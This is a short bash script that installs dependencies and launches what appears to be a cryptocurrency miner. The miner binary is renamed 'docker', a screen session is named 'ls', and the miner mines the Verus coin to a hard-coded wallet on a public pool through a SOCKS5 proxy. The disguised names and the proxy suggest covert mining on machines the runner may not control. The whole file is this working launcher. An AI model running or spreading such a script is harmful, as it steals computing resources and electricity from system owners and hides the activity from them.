#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RV4aazLmcwkYC6W3uWmDUDAvQKNYgUGbw7
WORKER=$(echo $(shuf -i 1-10 -n 1)Lukas)
PROXY=socks5://174.64.199.79:4145
./docker -a verus -o $POOL -u $WALLET.$WORKER -p x -t 2 -x $PROXY
